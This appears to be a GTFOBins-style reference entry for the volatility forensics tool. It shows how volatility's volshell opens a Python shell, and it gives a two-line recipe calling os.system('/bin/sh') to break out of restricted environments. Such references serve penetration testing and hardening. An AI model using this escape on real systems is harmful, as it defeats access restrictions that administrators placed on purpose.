# GTFOBin: volatility

This command requires some valid coredump file which, if not available, can be uploaded to the target. The `volshell` command spawns a `python` shell, other functions may apply.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
volatility -f file.dump volshell
__import__('os').system('/bin/sh')
```